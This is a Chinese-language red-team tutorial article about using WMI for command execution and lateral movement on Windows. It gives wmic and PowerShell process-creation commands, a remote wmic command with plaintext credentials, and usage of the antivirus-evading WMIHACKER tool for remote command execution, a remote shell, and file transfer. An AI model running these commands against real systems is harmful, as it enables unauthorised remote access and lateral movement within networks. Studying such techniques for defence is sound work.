<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1WPocDzZ3zEma0l7t3WKmw)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

免责声明

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

WMI 无回显命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

Win32_Process 类中有个 Create 方法，可以启动新的进程。比如我们弹出一个计算器：

```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9CmPQ2Npo96RP2rwEl0cQmP1fZOQuj6qw40zePDzN9dCPv0pkl3wDd58FdLEibkT2Wv1ZIibbP3A4IQ/640?wx_fmt=png)

在这个命令中，Invoke-WmiMethod 是用来调用 WMI 类方法的 PowerShell 命令，-Class 参数是类的名称，-Name 参数是要调用的方法名，-ArgumentList 参数是传给这个方法的参数。

当然，也可以通过 wmic 命令进行命令执行：

```
WMIC Process Call Create "cmd /c calc.exe"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9CmPQ2Npo96RP2rwEl0cQmPJfaEVMXP5GMFYCB8JJ8pHefpQsbUSLmORYfAkSKXAwWCicicknzXNhRA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

WMI 横向移动

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

大多数 Windows 系统自带 wmic 命令而 wmic 命令是允许远程执行命令的，如果目标端口开放 135 端口，且允许随机一个高位端口进行通信。那么就可以通过以下命令对远程机器进行远程命令执行：

```
wmic /node:192.168.1.158 /user:fatmo /password:admin123  process call create "cmd.exe /c ipconfig>d:\result.txt"

```

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

工具推荐：WMIHACKER

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

WMIHACKER 是一个免杀的，通过 WMI 进行横向移动命令执行测试工具 (无需 445 端口)。主要功能为：1、命令执行；2、文件上传；3、文件下载；4、PTH 使用。传送门：https://github.com/rootclay/WMIHACKER

使用方法：

```
C:\Users\administrator\Desktop>cscript //nologo WMIHACKER_0.6.vbs
__          ____  __ _____   _    _          _____ _  ________ _____
\ \        / /  \/  |_   _| | |  | |   /\   / ____| |/ /  ____|  __ \
 \ \  /\  / /| \  / | | |   | |__| |  /  \ | |    | ' /| |__  | |__) |
  \ \/  \/ / | |\/| | | |   |  __  | / /\ \| |    |  < |  __| |  _  /
   \  /\  /  | |  | |_| |_  | |  | |/ ____ \ |____| . \| |____| | \ \
    \/  \/   |_|  |_|_____| |_|  |_/_/    \_\_____|_|\_\______|_|  \_\
                              v0.6beta       By. Xiangshan@360RedTeam
Usage:
        WMIHACKER.vbs  /cmd  host  user  pass  command GETRES?
        WMIHACKER.vbs  /shell  host  user  pass
        WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath
        WMIHACKER.vbs  /download  host  user  pass  localpath remotepath
          /cmd          single command mode
          host          hostname or IP address
          GETRES?       Res Need Or Not, Use 1 Or 0
          command       the command to run on remote host

```

*   有命令回显执行方式
    

```
cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1

```

*   无命令回显
    

```
cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo > c:\1.txt" 0

```

*   模拟 shell 模式
    

```
cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!"

```

*   文件上传 - 复制本机 calc.exe 到远程主机 c:\calc.exe
    

```
cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator "Password!" "c:\windows\system32\calc.exe" "c:\calc"

```

*   文件下载 - 下载远程主机 calc.exe 到本地 c:\calc.exe
    

```
cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe"

```

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

总结

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

本章我们讲述了利用 WMI 进行无回显命令执行和横向移动的方法，如果目标机器开放了 135 端口且允许高位端口连接即可进行横向移动。下一章我们将讲述 WMI 如何与 PowerShell 配合实现无回显后门。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9B7vZdL5TFiaHdDq5o1RLL1ja6dE33eaySFgeGz1d7As5DibPIUNnwgx7eKPcVEz8FwFTB1ygqOdgbg/640?wx_fmt=png&from=appmsg)